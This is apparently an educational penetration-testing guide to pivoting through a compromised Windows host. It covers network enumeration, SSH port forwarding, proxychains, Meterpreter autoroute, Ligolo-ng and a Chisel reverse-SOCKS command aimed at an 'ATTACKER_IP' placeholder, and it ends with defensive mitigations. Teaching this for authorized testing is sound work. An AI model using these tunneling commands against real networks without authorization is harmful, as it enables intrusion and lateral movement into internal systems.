# Introduction

Windows pivoting is the process of using a compromised Windows machine as a bridge to access internal networks and systems that are not directly reachable by the attacker.

During penetration testing, attackers often compromise one Windows host exposed to the internet and use it to access internal resources.

The objective:

```
Attacker Machine

↓

Compromised Windows Host

↓

Internal Network

↓

Additional Targets
```

---

# What is Windows Pivoting?

Pivoting allows a penetration tester to route traffic through a compromised machine.

The compromised system becomes a gateway between:

- The attacker
- Hidden internal systems

Example:

```
Kali Linux

IP:
192.168.1.50


↓

Compromised Windows Server

IP:
10.10.10.5


↓

Internal Database Server

IP:
10.10.20.10
```

The attacker cannot directly reach:

```
10.10.20.10
```

but can access it through the Windows machine.

---

# Why Windows Pivoting Matters

Modern networks are usually segmented.

Example:

```
Internet

↓

DMZ

↓

Internal Network

↓

Database Network
```

External attackers may only see:

```
Web Server
```

After compromising it, they can discover:

- File servers
- Domain controllers
- Databases
- Internal applications

# Windows Network Architecture

Important Windows networking concepts:

## Network Interfaces

A machine may have multiple interfaces.

Example:

```
Ethernet Adapter

192.168.1.20


Internal Adapter

10.10.10.5
```

The second interface allows access to another network.

---

## Routing

Windows decides where traffic goes using routing tables.

View routes:

```cmd
route print
```

Example:

```
10.10.20.0/24

via

10.10.10.5
```

# Identifying Windows Network Information

After obtaining a shell:

---

## IP Configuration

Command:

```cmd
ipconfig
```

Detailed:

```cmd
ipconfig /all
```

Look for:

- IP addresses
- Gateways
- DNS servers
- Multiple adapters

---

## Routing Table

Command:

```cmd
route print
```

Example:

```
Network Destination

10.10.20.0

Interface

10.10.10.5
```

---

## ARP Table

Command:

```cmd
arp -a
```

Shows recently contacted hosts.

Example:

```
10.10.20.15

10.10.20.25
```

# Discovering Internal Hosts

After identifying internal networks, discover active hosts.

Example network:

```
10.10.20.0/24
```

Scan:

```bash
nmap -sn 10.10.20.0/24
```

Possible targets:

```
10.10.20.10 Database

10.10.20.15 File Server

10.10.20.20 Domain Controller
```

# Port Forwarding

Port forwarding redirects traffic through the compromised machine.

Example:

```
Attacker

localhost:8080

↓

Windows Host

↓

Internal Web Server:80
```

The attacker accesses the internal service through a local port.

---

# SSH Tunneling

SSH can create secure tunnels.

Local forwarding:

```bash
ssh -L LOCAL_PORT:TARGET:TARGET_PORT user@pivot
```

Example:

```bash
ssh -L 8080:10.10.20.10:80 user@192.168.1.20
```

Access:

```
localhost:8080
```

connects to:

```
10.10.20.10:80
```

---

# SOCKS Proxy Pivoting

SOCKS proxies allow multiple connections through a pivot.

Example:

```
Kali

↓

SOCKS Proxy

↓

Windows Pivot

↓

Internal Network
```

Useful for:

- Nmap
- Browsers
- Burp Suite
- Other tools

---

# Proxychains With Windows Pivoting

Proxychains forces applications through a proxy.

Configuration:

```bash
nano /etc/proxychains.conf
```

Add:

```
socks5 127.0.0.1 1080
```

Run:

```bash
proxychains nmap -sT 10.10.20.10
```

Traffic:

```
Nmap

↓

Proxychains

↓

Tunnel

↓

Internal Host
```

# Meterpreter Pivoting

Metasploit supports pivoting through Meterpreter sessions.

Start:

```bash
msfconsole
```

After obtaining a session:

```text
sessions
```

Example:

```
1 meterpreter
```

---

Add route:

```text
run autoroute -s 10.10.20.0/24
```

Verify:

```text
route print
```

Now Metasploit can access the internal network.

---

# Ligolo-ng Pivoting

Ligolo-ng creates a lightweight tunnel between attacker and compromised host.

Architecture:

```
Attacker Proxy

↓

Agent on Windows Host

↓

Internal Network
```

Advantages:

- Easy routing
- Fast tunneling
- Works without complex configuration

---

Basic workflow:

Attacker:

```
Start proxy
```

Windows:

```
Execute agent
```

Create tunnel:

```
Start session

↓

Add route

↓

Access internal network
```

# Chisel Tunneling

Chisel creates TCP tunnels using HTTP.

Example:

Attacker:

```bash
chisel server --reverse -p 8000
```

Windows:

```cmd
chisel client ATTACKER_IP:8000 R:socks
```

Creates:

```
SOCKS Proxy
```

# Defense & Mitigation

Protect against pivoting by:

- Segmenting networks
- Restricting unnecessary access
- Monitoring internal traffic
- Using host firewalls
- Applying least privilege
- Detecting unusual tunnels
- Monitoring remote tools
